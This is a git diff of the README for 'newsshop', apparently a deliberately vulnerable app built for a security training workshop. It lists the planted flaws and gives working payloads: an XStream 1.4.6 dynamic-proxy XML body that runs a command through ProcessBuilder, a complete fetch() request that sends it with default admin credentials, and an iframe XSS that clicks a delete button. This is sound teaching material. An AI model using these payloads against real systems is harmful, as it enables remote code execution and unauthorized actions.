@@ -22,7 +22,7 @@ sudo docker run  -p 8080:8080 newsshop1.0.0
 
 ## Included known vulnerabilities:
 
-In the src/examples/java there are integration tests that demostrate SQL injection and XSS in the newsshop. 
+In the src/examples/java there are integration tests that demonstrate SQL injection and XSS in the newsshop. 
 
 ```
  ./gradlew practiceTests 
@@ -57,24 +57,61 @@ In the src/examples/java there are integration tests that demostrate SQL injecti
 
 ### Invalid Supply Chain
 * xstream in 1.4.6 contains a command injection vulnerability
-  * `http://localhost:8080/api/newsletter/import` with payload
-    ```
-    <newsletter class='dynamic-proxy'>
+
+#### complete fetch code for invalid supply chain on linux/mac
+* post into browser console
+```
+fetch("http://localhost:8080/api/newsletter/import", {
+headers: {
+"accept": "application/json, text/plain, */*",
+"authorization": "Basic YWRtaW46YWRtaW4=",
+"cache-control": "no-cache",
+"Content-Type": "application/xml"
+},
+referrer: "http://localhost:8080/subscribe.html",
+referrerPolicy: "strict-origin-when-cross-origin",
+body: `<newsletter class="dynamic-proxy">
         <interface>com.andrena.newsshop.model.Newsletterable</interface>
-        <handler class='java.beans.EventHandler'>
-            <target class='java.lang.ProcessBuilder'>
+        <handler class="java.beans.EventHandler">
+            <target class="java.lang.ProcessBuilder">
                 <command>
-                    <string>calc.exe</string>
+                    <string>touch</string>
+                    <string>mynewfile</string>
                 </command>
             </target>
             <action>start</action>
         </handler>
-    </newsletter>
-    ```
+    </newsletter>`,
+method: "POST",
+mode: "cors",
+credentials: "include"
+});
+```
+
+* connect to image and look for the generated file
+```
+$ docker exec -it newsshop-app-1 /bin/sh
+/app # ls
+```
+#### request  for invalid supply chain on windows
+* `http://localhost:8080/api/newsletter/import` with payload
+  ```
+  <newsletter class='dynamic-proxy'>
+      <interface>com.andrena.newsshop.model.Newsletterable</interface>
+      <handler class='java.beans.EventHandler'>
+          <target class='java.lang.ProcessBuilder'>
+              <command>
+                  <string>calc.exe</string>
+              </command>
+          </target>
+          <action>start</action>
+      </handler>
+  </newsletter>
+  ```
 
 ### Privileges
 * Admin and Users run in the same Application
-* Database contains Newsletters but also Passwords from another team (that has nothing to do with newletters)
+* Database contains Newsletters but also LaunchCode from another team and the Password (that has nothing to do with newletters)
 
 ## Planned/Possible vulnerabilities:
 
@@ -145,58 +182,17 @@ In the src/examples/java there are integration tests that demostrate SQL injecti
 <iframe src="javascript:window.parent.document.querySelector('.delete-btn').click()"></iframe>
 ```
 
-### to be continued
-* add XSS to confirmation page
-* add OpenAPI 
-* add old urls in the frontend code (to hint at mail properties?)
-
 ### Next steps:
 * docker
-* Struktur/Ablauf Workshop mit Secorvo, insbesondere die Inhalte (erstmal abwarten): Wie soll der Kurs laufen?
-* Folien fertigstellen
 * Tests für die Maßnahmen: Input Validation,...
-* Hints: über Anwendung, Handouts, über Fragen während des Workshops (die kann man schon vorbereiten)
 
 
-### how to get the participants to the attacks
+
+### hints
 
 * admin password can be guessed (should just be used to see the results of XSS and not as an attack)
 * e-mail: enter same value twice
 * sql: try the different input fields, start with '
 * MailProperties: guess, try things out, admin dashboard
 
-### complete fetch code for invalid supply chain on mac 
-* post into browser console
-```
-fetch("http://localhost:8080/api/newsletter/import", {
-headers: {
-"accept": "application/json, text/plain, */*",
-"authorization": "Basic YWRtaW46YWRtaW4=",
-"cache-control": "no-cache",
-"Content-Type": "application/xml"
-},
-referrer: "http://localhost:8080/subscribe.html",
-referrerPolicy: "strict-origin-when-cross-origin",
-body: `<newsletter class="dynamic-proxy">
-        <interface>com.andrena.newsshop.model.Newsletterable</interface>
-        <handler class="java.beans.EventHandler">
-            <target class="java.lang.ProcessBuilder">
-                <command>
-                    <string>touch</string>
-                    <string>mynewfile</string>
-                </command>
-            </target>
-            <action>start</action>
-        </handler>
-    </newsletter>`,
-method: "POST",
-mode: "cors",
-credentials: "include"
-});
-```
 
-* connect to image and look for the generated file
-```
-$ docker exec -it newsshop-app-1 /bin/sh
-/app # ls
-```
